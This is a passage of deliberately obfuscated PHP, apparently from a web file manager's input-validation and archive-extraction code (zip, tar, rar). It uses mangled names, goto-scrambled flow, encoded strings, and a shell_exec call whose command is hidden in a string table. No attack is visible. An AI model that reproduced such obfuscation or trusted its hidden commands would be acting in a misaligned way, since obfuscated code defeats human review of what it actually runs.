$CŞîí¦¶ì = $bÄáĞ‘¶ê ? json_decode($bÄáĞ‘¶ê, !0) : $CŞîí¦¶ì; $GLOBALS[$F¬Æ”‡ë¤İ[35]] = 0; return $CŞîí¦¶ì; goto d¬é‡‹ËöÚ; d¬é‡‹ËöÚ: } goto AíÔİ±è†¥; AíÔİ±è†¥: function beforeShutdown() { Hook::trigger($_SERVER[œˆâ˜åÊâè][36]); } $_SERVER[$_SERVER[œˆâ˜åÊâè][37]] = BASIC_PATH; $_SERVER[$_SERVER[œˆâ˜åÊâè][38]] = LIB_DIR; goto DôÎÉƒ»Ì®; d¦Óõãñˆ: $_SERVER[¯Ú‚è] = explode($_SERVER[¶ªÕß‚ØÁŸ][556], gzinflate(substr($_SERVER[¶ªÕß‚ØÁŸ][557], 10, -8))); $A™¾²êã¶› = $_SERVER[¶ªÕß‚ØÁŸ][558]; while ($A™¾²êã¶› < $_SERVER[¶ªÕß‚ØÁŸ][559]) { if ($A™¾²êã¶› >= 0) { break; } $A™¾²êã¶›++; } goto b˜ê¨…Àå§; eÖØˆ±†™ : function beforeShutdownFatalError($Bé´Æ¤²¶) { think_exception($Bé´Æ¤²¶); } $_SERVER[$_SERVER[œˆâ˜åÊâè][48]] = $C·¸Ì…ç„($_SERVER[$_SERVER[œˆâ˜åÊâè][45]]); $dÔäƒš°æº = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto CŒ¨¡²»òç; e„î®®«ÄÃ: class Input { public static function getArray($fŠˆµ¨‘Ò) { goto Bê­õ’Êª‘; BŞƒ…¥¢¿: if (count($Dì˜Ô×ğƒ°) > 0) { show_json(implode($Fëùİ¯íÍŒ[1884], $Dì˜Ô×ğƒ°), !1); } return $Dè¬›ù¼Ø; goto bä÷ö¦äà; AÃ¾ñĞ¢»œ: $Dì˜Ô×ğƒ° = array(); $E¶‡»—÷…š = LNG($Fëùİ¯íÍŒ[1880]); foreach ($fŠˆµ¨‘Ò as $f×Àò††¡ => $A±ßµ¢¼Ú†) { goto e½ö”÷µ; e½ö”÷µ: $a¨ù‚Šì¸˜ = _get($A±ßµ¢¼Ú†, $Fëùİ¯íÍŒ[1250], $E¶‡»—÷…š . $Fëùİ¯íÍŒ[886] . $f×Àò††¡); $C‘ˆ¬ Ş° = $f×Àò††¡; if (isset($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1881]]) && $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1881]]) { $C‘ˆ¬ Ş° = $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1881]]; } goto E—à¡ˆ¶; E—à¡ˆ¶: if (!array_key_exists($f×Àò††¡, $in)) { if (array_key_exists($Fëùİ¯íÍŒ[1882], $A±ßµ¢¼Ú†)) { if (!is_null($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1882]])) { $Dè¬›ù¼Ø[$C‘ˆ¬ Ş°] = $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1882]]; } } else { if (isset($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1883]])) { $Dì˜Ô×ğƒ°[] = $a¨ù‚Šì¸˜; } } continue; } if (isset($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1883]]) && $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1883]] == $Fëùİ¯íÍŒ[291]) { $dÌÆ¼Ó†±´ = json_decode($in[$f×Àò††¡], !0); if (is_array($dÌÆ¼Ó†±´)) { $Dè¬›ù¼Ø[$C‘ˆ¬ Ş°] = $dÌÆ¼Ó†±´; } else { if (array_key_exists($Fëùİ¯íÍŒ[1882], $A±ßµ¢¼Ú†)) { if (!is_null($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1882]])) { $Dè¬›ù¼Ø[$C‘ˆ¬ Ş°] = $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1882]]; } } else { $Dì˜Ô×ğƒ°[] = $a¨ù‚Šì¸˜; } } continue; } $fÁİ’ê³¬ = _get($A±ßµ¢¼Ú†, $Fëùİ¯íÍŒ[1015]); goto BÓÕç¾å†Õ; BÓÕç¾å†Õ: if (isset($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1883]]) && !self::check($in[$f×Àò††¡], $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1883]], $fÁİ’ê³¬)) { if (array_key_exists($Fëùİ¯íÍŒ[1882], $A±ßµ¢¼Ú†)) { if (!is_null($A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1882]])) { $Dè¬›ù¼Ø[$C‘ˆ¬ Ş°] = $A±ßµ¢¼Ú†[$Fëùİ¯íÍŒ[1882]]; } } else { $Dì˜Ô×ğƒ°[] = $a¨ù‚Šì¸˜; } continue; } $Dè¬›ù¼Ø[$C‘ˆ¬ Ş°] = $in[$f×Àò††¡]; goto EìœíÄ¹Ù“; EìœíÄ¹Ù“: } goto BŞƒ…¥¢¿; Bê­õ’Êª‘: $Fëùİ¯íÍŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; global $in; $Dè¬›ù¼Ø = array(); goto AÃ¾ñĞ¢»œ; bä÷ö¦äà: } public static function reg($cÈŒ÷Ôˆ©“ = "\162\x65\x71\165\151\x72\x65") { static $f¢¦½ó®õÔ = array("\x72\145\x71\165\151\x72\x65" => "\x2e\53", "\x6e\x75\x6d\142\145\162" => "\x5c\x64\53", "\x68\145\170" => "\x5b\60\55\x39\101\55\106\x61\55\x66\x5d\53", "\151\156\x74" => "\x5b\55\x5c\x2b\135\x3f\134\x64\x2b", "\142\x6f\157\x6c" => "\x30\x7c\61", "\x66\154\x6f\141\164" => "\x5b\x2d\134\x2b\135\77\x5c\144\53\50\134\x2e\134\144\x2b\51\77", "\x65\156\147\x6c\151\x73\150" => "\133\x41\x2d\x5a\x61\55\x7a\40\135\53", "\143\150\151\x6e\145\163\145" => "\x5b\134\x78\x7b\64\x65\x30\x30\175\x2d\x5c\x78\173\x39\146\141\65\175\x5d\53", "\150\x61\x73\x43\150\x69\x6e\x65\x73\145" => "\x2f\50\x5b\x5c\170\x7b\x34\145\60\60\x7d\55\134\170\x7b\x39\x66\x61\65\x7d\x5d\53\51\57\165", "\x65\155\141\151\x6c" => "\134\x77\x2b\50\133\134\x2e\134\x2d\x5d\x5c\x77\53\51\x2a\x5c\100\134\167\x2b\x28\133\134\x2e\x5c\55\x5d\x5c\167\x2b\x29\52\134\x2e\134\167\53", "\160\x68\x6f\x6e\145" => "\61\x5b\63\x2d\x39\x5d\134\144\173\x39\175", "\164\145\x6c\160\150\x6f\x6e\x65" => "\x28\x5c\x28\x5c\144\x7b\63\x2c\x34\175\134\51\x7c\134\144\173\63\54\64\175\55\x7c\x5c\163\x29\77\x5c\x64\x7b\67\54\x31\x34\x7d", "\x75\162\154" => "\50\150\164\x74\x70\x7c\x66\164\160\174\x68\x74\164\x70\163\x29\x3a\134\57\134\x2f\133\134\x77\134\55\x5f\135\x2b\50\x5c\56\x5b\x5c\167\134\55\137\x5d\53\51\53\50\x5b\x5c\x77\x5c\55\x5c\x2e\54\x40\x3f\136\x3d\x25\46\72\x5c\57\176\x5c\x2b\43\x5d\52\133\134\x77\134\x2d\x5c\x40\x3f\136\75\45\46\x5c\x2f\x7e\x5c\53\x23\x5d\x29\x3f", "\165\x72\154\106\x75\x6c\x6c" => "\133\x61\x2d\x7a\x41\x2d\172\135\x2b\x3a\134\x2f\x5c\57\133\x5e\134\x73\x5d\x2a", "\x69\x70" => "\50\x5c\144\173\x31\54\63\x7d\134\56\51\x7b\x33\x7d\50\134\x64\x7b\61\x2c\63\x7d\51", "\x7a\x69\x70" => "\x5b\61\x2d\71\x5d\x5c\144\173\65\175\50\77\x21\x5c\144\x29", "\151\144\103\x61\162\144" => "\x28\x5c\144\x7b\x31\x35\x7d\51\174\50\134\x64\173\61\67\175\50\134\x64\174\130\x7c\170\51\x29", "\143\157\x6c\x6f\162" => "\43\50\133\x30\55\x39\101\55\106\141\55\146\135\x7b\63\175\x7c\133\60\x2d\71\x41\x2d\x46\x61\55\146\x5d\x7b\x36\175\x29", "\x74\151\x6d\x65" => "\50\133\x30\55\61\x5d\134\x64\174\62\x5b\x30\55\x34\x5d\51\72\133\60\55\x35\x5d\134\x64", "\144\x61\164\145" => "\x5c\144\x7b\64\175\133\x2d\x5c\x2f\x5d\x3f\x28\60\x5b\x31\55\71\135\x7c\61\133\x30\55\62\135\x29\133\x2d\134\57\135\77\x28\x5b\x30\55\x32\x5d\134\x64\x7c\63\133\60\x2d\x31\x5d\x29", "\x64\x61\x74\x65\x54\x69\155\x65" => "\134\x64\x7b\x34\x7d\133\x2d\134\57\135\77\x28\60\x5b\61\55\x39\135\174\61\x5b\x30\x2d\x32\x5d\51\x5b\55\x5c\57\135\x3f\50\x5b\x30\x2d\x32\x5d\x5c\x64\x7c\x33\133\x30\55\x31\x5d\x29\x5c\163\x2b\50\133\x30\x2d\61\x5d\134\144\x7c\x32\133\60\55\x34\135\51\72\133\60\55\65\135\x5c\x64", "\x70\x61\163\x73\167\157\x72\x64" => "\x28\77\75\56\52\134\144\x29\50\77\75\56\x2a\x5b\141\x2d\x7a\x5d\51\50\x3f\75\56\52\133\101\x2d\x5a\x5d\51\56\173\x38\x2c\62\60\x7d", "\x6b\145\x79" => "\133\101\55\132\141\x2d\172\60\55\71\137\134\55\134\56\135\53", "\153\145\171\x46\x75\154\x6c" => "\133\101\55\x5a\141\55\x7a\x30\x2d\x39\x5f\x5c\x2d\134\x2e\x5c\x73\54\x5d\53"); if (!$cÈŒ÷Ôˆ©“) { return $f¢¦½ó®õÔ; } return $f¢¦½ó®õÔ[$cÈŒ÷Ôˆ©“]; } public static function check($EˆÂÏöøã, $AÈ´£ù¸°‰, $C£‘»ïÍ = null) { $A¾Å—ëœËÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; switch ($AÈ´£ù¸°‰) { case $A¾Å—ëœËÙ[7]: return in_array($EˆÂÏöøã, $C£‘»ïÍ); break; case $A¾Å—ëœËÙ[1885]: return floatval($EˆÂÏöøã) > $C£‘»ïÍ; break; case $A¾Å—ëœËÙ[1886]: return floatval($EˆÂÏöøã) < $C£‘»ïÍ; break; case $A¾Å—ëœËÙ[334]: return strlen($EˆÂÏöøã) >= $C£‘»ïÍ[0] && strlen($EˆÂÏöøã) <= $C£‘»ïÍ[1]; break; case $A¾Å—ëœËÙ[334]: if (is_array($C£‘»ïÍ)) { return strlen($EˆÂÏöøã) >= $C£‘»ïÍ[0] && strlen($EˆÂÏöøã) <= $C£‘»ïÍ[1]; break; } else { return strlen($EˆÂÏöøã) == $C£‘»ïÍ; break; } case $A¾Å—ëœËÙ[330]: return floatval($EˆÂÏöøã) >= $C£‘»ïÍ[0] && floatval($EˆÂÏöøã) <= $C£‘»ïÍ[1]; break; } $FßÚÇ‹àĞ÷ = self::reg(!1); $AÈ´£ù¸°‰ = isset($FßÚÇ‹àĞ÷[$AÈ´£ù¸°‰]) ? $FßÚÇ‹àĞ÷[$AÈ´£ù¸°‰] : $AÈ´£ù¸°‰; if (substr($AÈ´£ù¸°‰, 0, 1) != $A¾Å—ëœËÙ[8]) { $AÈ´£ù¸°‰ = $A¾Å—ëœËÙ[1887] . $AÈ´£ù¸°‰ . $A¾Å—ëœËÙ[1888]; } return preg_match($AÈ´£ù¸°‰, $EˆÂÏöøã) === 1; } public static function get($fÉºÂÃÙùÔ, $F‘‹Šï£‡ = null, $EªÛà½’± = null, $BŸÈ—¦ê = null) { goto CÊ›¿ñ¶ƒÉ; CÊ›¿ñ¶ƒÉ: $bé‘Ê±Ëù© =& $_SERVER[¶ªÕß‚ØÁŸ]; $F³ƒŸ†êàÅ = array(); if (!is_null($EªÛà½’±)) { $F³ƒŸ†êàÅ[$bé‘Ê±Ëù©[34]] = $EªÛà½’±; } goto c¾Ö§Ùù×; c¾Ö§Ùù×: if (!is_null($BŸÈ—¦ê)) { $F³ƒŸ†êàÅ[$bé‘Ê±Ëù©[1015]] = $BŸÈ—¦ê; } if (!is_null($F‘‹Šï£‡)) { $F³ƒŸ†êàÅ[$bé‘Ê±Ëù©[1883]] = $F‘‹Šï£‡; } $eôÁö‹¢à = Input::getArray(array($fÉºÂÃÙùÔ => $F³ƒŸ†êàÅ)); goto Dñ Š†; Dñ Š†: return $eôÁö‹¢à[$fÉºÂÃÙùÔ]; goto B”îÙ¶ôÆ™; B”îÙ¶ôÆ™: } } class KodArchive { static function init() { goto dõ†ÜÊá¬Í; dõ†ÜÊá¬Í: $e®·×¨Èæ™ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (defined($e®·×¨Èæ™[1889])) { return; } define($e®·×¨Èæ™[1889], SDK_DIR . $e®·×¨Èæ™[1890]); goto cÂ‘ÚÖ‰ƒ…; câ—ÌóÏŞ: require_once ARCHIVE_LIB . $e®·×¨Èæ™[1897]; require_once ARCHIVE_LIB . $e®·×¨Èæ™[1898]; require_once ARCHIVE_LIB . $e®·×¨Èæ™[1899]; goto AÀ¾µ¿Šà; AÀ¾µ¿Šà: require_once ARCHIVE_LIB . $e®·×¨Èæ™[1900]; goto bê´ê´ÊôŸ; DÀá°ÓØÓ’: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $e®·×¨Èæ™[1895]; require_once ARCHIVE_LIB . $e®·×¨Èæ™[1896]; goto câ—ÌóÏŞ; cÂ‘ÚÖ‰ƒ…: define($e®·×¨Èæ™[1891], TEMP_FILES); define($e®·×¨Èæ™[1892], TEMP_FILES); define($e®·×¨Èæ™[1893], $e®·×¨Èæ™[1894]); goto DÀá°ÓØÓ’; bê´ê´ÊôŸ: } static function checkIfType($A½ïøóáÛ, $bİ­‚ÇÎãÂ) { goto bÄÀ•â ë; bÄÀ•â ë: $c­İåš¢ğĞ =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); $bÊÜ„İö³¥ = array($c­İåš¢ğĞ[310] => array($c­İåš¢ğĞ[310], $c­İåš¢ğĞ[1901], $c­İåš¢ğĞ[1902], $c­İåš¢ğĞ[1903]), $c­İåš¢ğĞ[1904] => array($c­İåš¢ğĞ[1904], $c­İåš¢ğĞ[1905], $c­İåš¢ğĞ[1047], $c­İåš¢ğĞ[1045]), $c­İåš¢ğĞ[1049] => array($c­İåš¢ğĞ[1049], $c­İåš¢ğĞ[1906], $c­İåš¢ğĞ[1907], $c­İåš¢ğĞ[1908], $c­İåš¢ğĞ[1909], $c­İåš¢ğĞ[1910], $c­İåš¢ğĞ[1911])); goto B°·ãöÔêÔ; B°·ãöÔêÔ: $DÍŠ‡óâœŒ = in_array($A½ïøóáÛ, $bÊÜ„İö³¥[$bİ­‚ÇÎãÂ]); if ($DÍŠ‡óâœŒ && ($bİ­‚ÇÎãÂ == $c­İåš¢ğĞ[310] || $bİ­‚ÇÎãÂ == $c­İåš¢ğĞ[1904]) && (!function_exists($c­İåš¢ğĞ[1912]) || !function_exists($c­İåš¢ğĞ[1913]))) { show_tips($c­İåš¢ğĞ[1914]); } if ($DÍŠ‡óâœŒ && $bİ­‚ÇÎãÂ == $c­İåš¢ğĞ[1049] && (!function_exists($c­İåš¢ğĞ[1915]) || !strstr(shell_exec($c­İåš¢ğĞ[1916]), $c­İåš¢ğĞ[1917]))) { show_tips($c­İåš¢ğĞ[1918]); } goto f¼¹«ã´­«; f¼¹«ã´­«: return $DÍŠ‡óâœŒ; goto B„åğ¥õ‡; B„åğ¥õ‡: } static function listContent($C‰Åæ•›Ğë, $F­Áá‚Å = true) { $BˆôÀÖïÆ =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); $A»åìßÉï = !empty($GLOBALS[$BˆôÀÖïÆ[1053]]) ? $GLOBALS[$BˆôÀÖïÆ[1053]] : get_path_ext($C‰Åæ•›Ğë); $Bà¿‰¨Ê²˜ = !1; if (self::checkIfType($A»åìßÉï, $BˆôÀÖïÆ[1904])) { $d‰ó¨¯ä = PclTarList($C‰Åæ•›Ğë, $A»åìßÉï); $Bà¿‰¨Ê²˜ = array(); for ($d¹¯¢Â‰ÃÑ = 0; $d¹¯¢Â‰ÃÑ < count($d‰ó¨¯ä); $d¹¯¢Â‰ÃÑ++) { $cè‰ğç¨Ôø = $d‰ó¨¯ä[$d¹¯¢Â‰ÃÑ]; if ($cè‰ğç¨Ôø[$BˆôÀÖïÆ[1919]] == $BˆôÀÖïÆ[1920] || $cè‰ğç¨Ôø[$BˆôÀÖïÆ[1919]] == $BˆôÀÖïÆ[1921]) { continue; } if ($F­Áá‚Å) { $cè‰ğç¨Ôø[$BˆôÀÖïÆ[1922]] = ltrim($cè‰ğç¨Ôø[$BˆôÀÖïÆ[1922]], $BˆôÀÖïÆ[1158]); } if ($cè‰ğç¨Ôø[$BˆôÀÖïÆ[1919]] == $BˆôÀÖïÆ[1923]) { $cè‰ğç¨Ôø[$BˆôÀÖïÆ[86]] = !0; } else { $cè‰ğç¨Ôø[$BˆôÀÖïÆ[86]] = !1; } $cè‰ğç¨Ôø[$BˆôÀÖïÆ[1040]] = $d¹¯¢Â‰ÃÑ; $Bà¿‰¨Ê²˜[] = $cè‰ğç¨Ôø; } } else { if (self::checkIfType($A»åìßÉï, $BˆôÀÖïÆ[1049])) { $DêŞÇ–°œ¤ = kodRarArchive::listContent($C‰Åæ•›Ğë); if (!$DêŞÇ–°œ¤[$BˆôÀÖïÆ[1036]]) { return $DêŞÇ–°œ¤; } else { $Bà¿‰¨Ê²˜ = $DêŞÇ–°œ¤[$BˆôÀÖïÆ[1038]]; } } else { if (kodZipArchive::support($BˆôÀÖïÆ[363])) { $Bà¿‰¨Ê²˜ = kodZipArchive::listContent($C‰Åæ•›Ğë); } else { $D±Ñ¹¯ğ = new PclZip($C‰Åæ•›Ğë); $Bà¿‰¨Ê²˜ = $D±Ñ¹¯ğ->listContent(); } } } if ($Bà¿‰¨Ê²˜) { $FñĞ¡ôÂĞè = unzip_charset_get($Bà¿‰¨Ê²˜); $F­Áá‚Å = $F­Áá‚Å && function_exists($BˆôÀÖïÆ[75]); for ($d¹¯¢Â‰ÃÑ = 0; $d¹¯¢Â‰ÃÑ < count($Bà¿‰¨Ê²˜); $d¹¯¢Â‰ÃÑ++) { $Bà¿‰¨Ê²˜[$d¹¯¢Â‰ÃÑ][$BˆôÀÖïÆ[1922]] = str_replace(array($BˆôÀÖïÆ[1076], $BˆôÀÖïÆ[1924]), $BˆôÀÖïÆ[776], $Bà¿‰¨Ê²˜[$d¹¯¢Â‰ÃÑ][$BˆôÀÖïÆ[1922]]); if ($F­Áá‚Å) { $Bà¿‰¨Ê²˜[$d¹¯¢Â‰ÃÑ][$BˆôÀÖïÆ[1922]] = iconv_to($Bà¿‰¨Ê²˜[$d¹¯¢Â‰ÃÑ][$BˆôÀÖïÆ[1922]], $FñĞ¡ôÂĞè, $BˆôÀÖïÆ[335]); unset($Bà¿‰¨Ê²˜[$d¹¯¢Â‰ÃÑ][$BˆôÀÖïÆ[1925]]); } } return array($BˆôÀÖïÆ[1036] => !0, $BˆôÀÖïÆ[1038] => $Bà¿‰¨Ê²˜); } else { return array($BˆôÀÖïÆ[1036] => !1, $BˆôÀÖïÆ[1038] => $Bà¿‰¨Ê²˜); } } static function extract($fÏæ‰³°, $b‰´¾è‹¦í, $B–àŠÅœˆö = "\x2d\61", &$DïÈÚ¦œÄÂ = false) { goto c²°Ç¡‰î; A¶ƒ§îä«…: if (self::checkIfType($Béö‘­–ôË, $Eˆ„õ¹É”Ê[1904])) { if ($B–àŠÅœˆö != $Eˆ„õ¹É”Ê[1035]) { $BİØ§ƒ©âˆ = unzip_pre_name($BİØ§ƒ©âˆ); $BòĞïæÇ = unzip_pre_name($BòĞïæÇ); $aÚ×öˆÈ·¡ = PclTarExtractList($fÏæ‰³°, array($BİØ§ƒ©âˆ), $b‰´¾è‹¦í, $BòĞïæÇ, $Béö‘­–ôË); } else { $aÚ×öˆÈ·¡ = PclTarExtract($fÏæ‰³°, $b‰´¾è‹¦í, $Eˆ„õ¹É”Ê[66], $Béö‘­–ôË); } return array($Eˆ„õ¹É”Ê[1036] => $aÚ×öˆÈ·¡, $Eˆ„õ¹É”Ê[1038] => PclErrorString(!0)); } else { if (self::checkIfType($Béö‘­–ôË, $Eˆ„õ¹É”Ê[1049])) { return kodRarArchive::extract($fÏæ‰³°, $b‰´¾è‹¦í, $Béö‘­–ôË, $DïÈÚ¦œÄÂ); } else { if (kodZipArchive::support($Eˆ„õ¹É”Ê[1926])) { return kodZipArchive::extract($fÏæ‰³°, $b‰´¾è‹¦í, $DïÈÚ¦œÄÂ); } else { $C»³­–¹ñŠ = new PclZip($fÏæ‰³°); if ($B–àŠÅœˆö != $Eˆ„õ¹É”Ê[1035]) { $aÚ×öˆÈ·¡ = $C»³­–¹ñŠ->extract(PCLZIP_OPT_PATH, $b‰´¾è‹¦í, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Eˆ„õ¹É”Ê[1927], PCLZIP_OPT_BY_NAME, $f®êÃ–Ü­†[$Eˆ„õ¹É”Ê[1922]], PCLZIP_OPT_REMOVE_PATH, $BòĞïæÇ, PCLZIP_OPT_REPLACE_NEWER); } else { $aÚ×öˆÈ·¡ = $C»³­–¹ñŠ->extract(PCLZIP_OPT_PATH, $b‰´¾è‹¦í, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Eˆ„õ¹É”Ê[1927], PCLZIP_OPT_REPLACE_NEWER); } return array($Eˆ„õ¹É”Ê[1036] => $aÚ×öˆÈ·¡, $Eˆ„õ¹É”Ê[1038] => $C»³­–¹ñŠ->errorName(!0)); } } } return array($Eˆ„õ¹É”Ê[1036] => !1, $Eˆ„õ¹É”Ê[1038] => $Eˆ„õ¹É”Ê[1928]); goto a—¥Ñ¼«½; c²°Ç¡‰î: $Eˆ„õ¹É”Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); $Béö‘­–ôË = !empty($GLOBALS[$Eˆ„õ¹É”Ê[1053]]) ? $GLOBALS[$Eˆ„õ¹É”Ê[1053]] : get_path_ext($fÏæ‰³°); goto a†¨ô¿Ù„¥; a†¨ô¿Ù„¥: $CùÔªôƒğ = self::listContent($fÏæ‰³°, !1); if (!$CùÔªôƒğ[$Eˆ„õ¹É”Ê[1036]]) { return $CùÔªôƒğ; } if ($B–àŠÅœˆö != $Eˆ„õ¹É”Ê[1035]) { goto fò†Œë´ßÕ; BšÃ„«ß¶: if ($f®êÃ–Ü­†[$Eˆ„õ¹É”Ê[86]]) { $BİØ§ƒ©âˆ = rtrim($BİØ§ƒ©âˆ, $Eˆ„õ¹É”Ê[8]) . $Eˆ„õ¹É”Ê[8]; $DïÈÚ¦œÄÂ = array($DïÈÚ¦œÄÂ); } $fã°ñšê‰Ì = str_replace($Eˆ„õ¹É”Ê[103], $Eˆ„õ¹É”Ê[8], $BİØ§ƒ©âˆ); if (substr($fã°ñšê‰Ì, -1) == $Eˆ„õ¹É”Ê[8]) { if (!strstr(trim($fã°ñšê‰Ì, $Eˆ„õ¹É”Ê[8]), $Eˆ„õ¹É”Ê[8])) { $b‰´¾è‹¦í = $b‰´¾è‹¦í . get_path_this($fã°ñšê‰Ì) . $Eˆ„õ¹É”Ê[8]; } } else { if ($BòĞïæÇ == $BİØ§ƒ©âˆ) { $BòĞïæÇ = $Eˆ„õ¹É”Ê[33]; } } goto FÏ‰¨Óã; f¡§…—´¯›: if ($GLOBALS[$Eˆ„õ¹É”Ê[6]][$Eˆ„õ¹É”Ê[1156]] != $Eˆ„õ¹É”Ê[335]) { $BİØ§ƒ©âˆ = unzip_pre_name($DïÈÚ¦œÄÂ); } $BòĞïæÇ = get_path_father($DïÈÚ¦œÄÂ); if ($BòĞïæÇ == $DïÈÚ¦œÄÂ) { $BòĞïæÇ = $Eˆ„õ¹É”Ê[33]; } goto BšÃ„«ß¶; fò†Œë´ßÕ: $f®êÃ–Ü­† = self::fileIndex($CùÔªôƒğ[$Eˆ„õ¹É”Ê[1038]], $B–àŠÅœˆö); $DïÈÚ¦œÄÂ = str_replace(array($Eˆ„õ¹É”Ê[1076], $Eˆ„õ¹É”Ê[1924]), $Eˆ„õ¹É”Ê[80], $f®êÃ–Ü­†[$Eˆ„õ¹É”Ê[1922]]); $BİØ§ƒ©âˆ = $DïÈÚ¦œÄÂ; goto f¡§…—´¯›; FÏ‰¨Óã: } goto A¶ƒ§îä«…; a—¥Ñ¼«½: } static function fileIndex($bšãœí‘®º, $b±÷Å†É•Î, $dÑñ˜Ûâİò = false) { goto cº˜ÆŞÆ—; bÛ‰Çğé×é: $eãâ²øôÄ¯ = $EÚ¬ñê·”÷; if ($dÑñ˜Ûâİò) { $eãâ²øôÄ¯ = $EÚ¬ñê·”÷[$dÑñ˜Ûâİò]; if ($EÚ¬ñê·”÷[$f‡â§®ƒ„”[86]]) { $eãâ²øôÄ¯ = rtrim($eãâ²øôÄ¯, $f‡â§®ƒ„”[8]) . $f‡â§®ƒ„”[8]; } } return $eãâ²øôÄ¯; goto B·¥¡Ô¾à; B¨È”ƒ“Â™: $F†ø¨½Ö¶¶ = count($bšãœí‘®º); for ($Fè™ÚˆÃã¦ = 0; $Fè™ÚˆÃã¦ < $F†ø¨½Ö¶¶; $Fè™ÚˆÃã¦++) { if ($b±÷Å†É•Î == $bšãœí‘®º[$Fè™ÚˆÃã¦][$f‡â§®ƒ„”[1040]]) { $EÚ¬ñê·”÷ = $bšãœí‘®º[$Fè™ÚˆÃã¦]; break; } } if (!$EÚ¬ñê·”÷) { show_tips($f‡â§®ƒ„”[1929]); } goto bÛ‰Çğé×é; cº˜ÆŞÆ—: $f‡â§®ƒ„” =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); if (!is_array($bšãœí‘®º)) { return !1; } goto B¨È”ƒ“Â™; B·¥¡Ô¾à: } static function extractZipFile($fÁÖ¾ğõ¨, $FÆæÄããÊ„, $e»ÎõÂä¾£ = false) { goto C…£Ş µ; C…£Ş µ: $Bí Œˆ†ã‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); $e÷‘æÍğß = TEMP_FILES . hash_path($fÁÖ¾ğõ¨) . $Bí Œˆ†ã‘[8]; goto F¨É˜²£´§; Eª¡ä®„Î: if (file_exists($CíÅí–’õä)) { return $CíÅí–’õä; } $d•³Ê£«å = new PclZip($fÁÖ¾ğõ¨); $EåîÎš®Øƒ = unzip_filter_ext($e÷‘æÍğß . get_path_this($FÆæÄããÊ„)); goto fãŞÔàëñ÷; fãŞÔàëñ÷: $B¥®™“ÏŸ = get_path_father($FÆæÄããÊ„); if ($B¥®™“ÏŸ == $FÆæÄããÊ„) { $B¥®™“ÏŸ = $Bí Œˆ†ã‘[33]; } $A¬­ßŸ§Ş = $d•³Ê£«å->extract(PCLZIP_OPT_PATH, $e÷‘æÍğß, PCLZIP_CB_PRE_FILE_NAME, $Bí Œˆ†ã‘[1927], PCLZIP_OPT_REMOVE_PATH, $B¥®™“ÏŸ, PCLZIP_OPT_BY_NAME, $FÆæÄããÊ„); goto b¥èßêğ‰ì; F¨É˜²£´§: mk_dir($e÷‘æÍğß); $CíÅí–’õä = $e÷‘æÍğß . md5($fÁÖ¾ğõ¨ . $FÆæÄããÊ„); if ($e»ÎõÂä¾£) { $CíÅí–’õä = $e÷‘æÍğß . $e»ÎõÂä¾£; } goto Eª¡ä®„Î; b¥èßêğ‰ì: if (!file_exists($EåîÎš®Øƒ)) { return !1; } @rename($EåîÎš®Øƒ, $CíÅí–’õä); return $CíÅí–’õä; goto FÛÊóåƒ·; FÛÊóåƒ·: } static function filePreview($D×Ÿñöö«, $FË‹Úø²ƒ³, $A­òÕñÉŞî = false, $cÖô÷Ó™”¬ = false) { goto CÌ«¿£ £; b¤å‘Şëâƒ: $b½¡ÏÜÆƒ– = self::extract($D×Ÿñöö«, $d¼Ğé´Ï±£, $FË‹Úø²ƒ³, $Bš¶ø·Èó); if (is_array($Bš¶ø·Èó)) { show_json($d‘Ë‰ØĞ—×[1930], !1); } if (file_exists($fèÀÌ“ ÎŸ)) { IO::fileOut($fèÀÌ“ ÎŸ, $A­òÕñÉŞî, get_path_this($Bš¶ø·Èó)); return; } goto fªò„êÊ¼; fªò„êÊ¼: $Bš¶ø·Èó = unzip_pre_name($Bš¶ø·Èó); $BßÂ–öŒÉ‡ = get_path_this($Bš¶ø·Èó); $b¬¨ÛÁƒå¬ = unzip_filter_ext($d¼Ğé´Ï±£ . $BßÂ–öŒÉ‡); goto eßÓË²šñø; CÌ«¿£ £: $d‘Ë‰ØĞ—× =& $_SERVER[¶ªÕß‚ØÁŸ]; self::init(); $d¼Ğé´Ï±£ = TEMP_FILES . hash_path($D×Ÿñöö«) . $d‘Ë‰ØĞ—×[8]; goto F×±ÕôĞ“¡; DÙÊÉÛÅé¾: if (!file_exists($fèÀÌ“ ÎŸ)) { del_dir($d¼Ğé´Ï±£); show_json($d‘Ë‰ØĞ—×[1932]); } IO::fileOut($fèÀÌ“ ÎŸ, $A­òÕñÉŞî, $BßÂ–öŒÉ‡); goto aî†Š•“èÃ; eßÓË²šñø: if (!$b½¡ÏÜÆƒ–[$d‘Ë‰ØĞ—×[1036]]) { show_json($b½¡ÏÜÆƒ–[$d‘Ë‰ØĞ—×[1038]], !1); } if (!file_exists($b¬¨ÛÁƒå¬)) { show_json($d‘Ë‰ØĞ—×[1931], !1); } @rename($b¬¨ÛÁƒå¬, $fèÀÌ“ ÎŸ); goto DÙÊÉÛÅé¾; F×±ÕôĞ“¡: mk_dir($d¼Ğé´Ï±£); $fèÀÌ“ ÎŸ = $d¼Ğé´Ï±£ . md5($D×Ÿñöö« . 